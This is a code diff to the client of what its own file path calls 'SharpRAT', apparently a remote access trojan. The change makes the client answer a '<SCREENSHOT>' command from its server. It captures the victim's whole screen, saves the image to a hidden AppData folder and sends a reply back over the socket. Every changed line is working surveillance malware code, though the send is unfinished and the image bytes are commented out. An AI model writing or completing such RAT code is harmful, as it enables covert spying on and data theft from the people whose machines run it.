@@ -59,23 +59,31 @@ namespace Client.Client
             }
             else if (tempString.StartsWith("<SCREENSHOT>"))
             {
+                Debug.WriteLine("received screenshot command");
 
+                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                Graphics g = Graphics.FromImage(bitmap);
+                g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+                Graphics memoryGraphics = Graphics.FromImage(bitmap);
+
+                memoryGraphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+
+                //That's it! Save the image in the directory and this will work like charm.  
+                string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\SharpRAT\screenshot\Screenshot" + "_" + DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");
+
+                // save it  
+                bitmap.Save(fileName);
                 MemoryStream ms = new MemoryStream();
-                GetScreen().Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
+                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
                 byte[] b = ms.ToArray();
-                GetServerSocket().Send(Encoding.ASCII.GetBytes("<SCREENSHOT>" + b + "<EOF>"));
+                Debug.WriteLine($"{b}");
+                GetServerSocket().Send(Encoding.ASCII.GetBytes("<SCREENSHOT>"/*+ b*/+"<EOF>"));
+                //GetServerSocket().Send(Encoding.ASCII.GetBytes($"{ b}"));
+                //GetServerSocket().Send(Encoding.ASCII.GetBytes("<EOF>"));
                 ms.Close();
-                Debug.WriteLine("ahgw");
+                Debug.WriteLine("sent data back");
             }
         }
-        private Bitmap GetScreen()
-        {
-            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            Graphics g = Graphics.FromImage(bitmap);
-            g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
-            return bitmap;
-        }
-
         public void ExecuteClient()
         {
             while (bShouldRun)
